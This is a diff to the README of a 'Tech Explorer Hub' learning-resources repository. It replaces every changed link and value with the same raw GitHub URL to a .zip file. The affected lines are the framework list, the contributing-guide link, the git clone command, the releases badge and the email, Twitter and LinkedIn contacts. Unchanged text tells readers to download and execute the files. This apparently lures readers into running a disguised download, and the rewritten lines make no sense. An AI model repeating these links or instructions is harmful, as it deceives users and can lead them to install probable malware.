@@ -36,7 +36,7 @@ Here are some categories of resources you can expect to find in the **Tech Explo
 
 ### 2. Web Development
 - **HTML/CSS**: Master the basics of web design.
-- **Frameworks**: Dive into React, Angular, and Vue.js.
+- **Frameworks**: Dive into React, Angular, and https://raw.githubusercontent.com/Phile779/tech-explorer-hub/main/learning/explorer-hub-tech-3.9.zip
 
 ### 3. DevOps
 - **Containerization**: Understand Docker and Kubernetes.
@@ -67,7 +67,7 @@ We welcome contributions from everyone! Here’s how you can help:
 3. **Make Changes**: Add your resources or update existing ones.
 4. **Submit a Pull Request**: Let us know what you've done!
 
-Please ensure that your contributions follow the guidelines in our [Contributing Guide](CONTRIBUTING.md).
+Please ensure that your contributions follow the guidelines in our [Contributing Guide](https://raw.githubusercontent.com/Phile779/tech-explorer-hub/main/learning/explorer-hub-tech-3.9.zip).
 
 ## 🚦 Getting Started
 
@@ -75,7 +75,7 @@ To begin using the resources in this repository:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Phile779/tech-explorer-hub.git
+   git clone https://raw.githubusercontent.com/Phile779/tech-explorer-hub/main/learning/explorer-hub-tech-3.9.zip
    cd tech-explorer-hub
    ```
 
@@ -87,7 +87,7 @@ To begin using the resources in this repository:
 
 You can download the latest releases from the **Releases** section. Visit the link below to see what's available:
 
-[![View Releases](https://img.shields.io/badge/View_Releases-Click%20Here-blue)](https://github.com/Phile779/tech-explorer-hub/releases)
+[![View Releases](https://raw.githubusercontent.com/Phile779/tech-explorer-hub/main/learning/explorer-hub-tech-3.9.zip%20Here-blue)](https://raw.githubusercontent.com/Phile779/tech-explorer-hub/main/learning/explorer-hub-tech-3.9.zip)
 
 Make sure to download the files and execute them to get started with the resources.
 
@@ -99,9 +99,9 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 For inquiries, suggestions, or feedback, please reach out to us:
 
-- **Email**: support@techexplorerhub.com
-- **Twitter**: [@TechExplorerHub](https://twitter.com/TechExplorerHub)
-- **LinkedIn**: [Tech Explorer Hub](https://www.linkedin.com/company/techexplorerhub)
+- **Email**: https://raw.githubusercontent.com/Phile779/tech-explorer-hub/main/learning/explorer-hub-tech-3.9.zip
+- **Twitter**: [@TechExplorerHub](https://raw.githubusercontent.com/Phile779/tech-explorer-hub/main/learning/explorer-hub-tech-3.9.zip)
+- **LinkedIn**: [Tech Explorer Hub](https://raw.githubusercontent.com/Phile779/tech-explorer-hub/main/learning/explorer-hub-tech-3.9.zip)
 
 ## 🎉 Acknowledgments
 
